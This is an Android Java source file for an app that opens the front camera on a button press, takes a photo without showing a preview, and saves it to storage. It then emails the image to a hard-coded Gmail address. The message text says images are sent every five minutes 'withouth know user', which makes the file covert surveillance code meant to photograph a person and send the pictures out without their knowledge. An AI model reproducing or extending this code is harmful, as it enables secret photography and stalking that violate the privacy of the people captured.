package com.automaticallytakepicture;

import android.hardware.Camera;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.automaticallytakepicture.SendingMail.SendMail;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    Button btn_takepic;
    Camera.PictureCallback mPicture;
    private File dir_image2;
    private FileOutputStream fos;
    Calendar calendar;
    SimpleDateFormat sdf;
    String sendingtime="";
    File tmpFile=null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        sdf=new SimpleDateFormat("dd-MM-yyyy hh:mm:ss");
        calendar=Calendar.getInstance();
        Date time=calendar.getTime();
        sendingtime=sdf.format(time);


        btn_takepic=(Button)findViewById(R.id.btn_takepic);
        btn_takepic.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                mPicture = new Camera.PictureCallback() {

                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) {
                        System.out.println("***************");
                        System.out.println(Base64.encodeToString(data, Base64.DEFAULT));
                        System.out.println("***************");
                        Log.e("ImageString",Base64.encodeToString(data, Base64.DEFAULT));

                        dir_image2 = new  File(Environment.getExternalStorageDirectory()+
                                File.separator+getPackageName());
                        dir_image2.mkdirs();


                        tmpFile = new File(dir_image2,sendingtime+".jpg");
                        Log.e("FileName",String.valueOf(tmpFile));
                        try {
                            fos = new FileOutputStream(tmpFile);
                            fos.write(data);
                            fos.close();
                        } catch (FileNotFoundException e) {
                            Toast.makeText(getApplicationContext(),"Error",Toast.LENGTH_LONG).show();
                        } catch (IOException e) {
                            Toast.makeText(getApplicationContext(),"Error",Toast.LENGTH_LONG).show();
                        }

                        sendEmail();
                    }
                };

                Camera mCamera=null;// = Camera.open();
                int cameraCount = 0;
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                cameraCount = Camera.getNumberOfCameras();
                for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
                    Camera.getCameraInfo(camIdx, cameraInfo);
                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        try {
                            mCamera = Camera.open(camIdx);
                            mCamera.startPreview();// I don't know why I added that,
                            // but without it doesn't work... :D

                            mCamera.takePicture(null, null, mPicture);
                        } catch (RuntimeException e) {
                            Log.e(getLocalClassName(), "Camera failed to open: " + e.getLocalizedMessage());
                        }
                    }
                }
            }
        });
    }

    private void sendEmail() {
        //Getting content for email
        String email = "sharafatshaikh7@gmail.com";
        String subject = "Daily Images";
        String message = "Send Image In Every 5 miuts withouth know user";

        Log.e("SendingBody", message);

        //Creating SendMail object
        SendMail sm = new SendMail(this, email, subject, message, String.valueOf(tmpFile));

        //Executing sendmail to send email
        sm.execute();
    }
}
